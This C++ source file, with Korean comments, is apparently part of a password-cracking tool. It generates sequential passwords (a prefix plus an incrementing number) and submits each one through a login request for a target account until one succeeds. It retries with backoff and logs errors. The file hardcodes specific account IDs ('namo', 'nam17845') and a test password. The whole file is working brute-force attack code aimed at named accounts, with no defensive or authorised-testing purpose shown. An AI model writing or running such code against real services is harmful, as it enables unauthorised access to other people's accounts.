#include "keygenSequenceNumber.h"
#include <windows.h>
#include <stdio.h>

// n부터 m
void SeqNumberEntry(char * targetId, char * prefixString, int beginNumber, int endNumber)
{
	char tryPassword[MAX_PASSWORD], writeBufferStr[LOGGING_BUFFER];
	int queryResult, i, remainRetry;

	// test
	strcpy_s(g_id, MAX_ID, "namo");						// set to global var(파라메터)
	queryResult = requestPassword("siroot");			// 검색시도
	printf("TEST NAMO\t%d\n", queryResult);		// 결과출력
	Sleep(500);

	strcpy_s(g_id, MAX_ID, targetId);			// set to global var(파라메터)
	for(i=beginNumber; i<=endNumber; i++)
	{
		wsprintf(tryPassword, "%s%d", prefixString, i);	// 검색할 문자열 생성
		remainRetry = RETRY_CONNECT;					// 시도 횟수 초기화
		do {
			queryResult = requestPassword(tryPassword);		// 검색시도
			printf("%s\t%d\n", tryPassword, queryResult);	// 결과출력

			if(TRUE == queryResult || CONNECT_ERROR == queryResult) return;	// 당첨 or 연결생성 실패
			else if(EXCEPT_ERROR == queryResult) {			// 연결오류
				// 로그 기록
				wsprintf(writeBufferStr,"[keygen Module]\r\n%s\t%d\r\n\r\n", tryPassword, queryResult);
				writeLog(writeBufferStr);
				remainRetry--;
				Sleep(RETRY_WAIT_SECOND*1000*(RETRY_CONNECT-remainRetry+1));
			}
			else break;
		} while(remainRetry);
		if(remainRetry <= 0) return;						// 재시도 회수 초과
	}
}

// 1부터 ∞
void SeqNumberEntry(char * targetId, char * prefixString)
{
	SeqNumberEntry(targetId, prefixString, MIN_SERCHING_NUMBER, MAX_SERCHING_NUMBER);
}

// n부터 ∞
void SeqNumberEntry(char * targetId, char * prefixString, int beginNumber)
{
	SeqNumberEntry(targetId, prefixString, beginNumber, MAX_SERCHING_NUMBER);
}

// id 생략 version
void SeqNumberEntry(char * prefixString)
{
	SeqNumberEntry("nam17845", prefixString);
}
void SeqNumberEntry(char * prefixString, int beginNumber)
{
	SeqNumberEntry("nam17845", prefixString, beginNumber);
}

void SeqNumberEntry(char * prefixString, int beginNumber, int endNumber)
{
	SeqNumberEntry("nam17845", prefixString, beginNumber, endNumber);
}
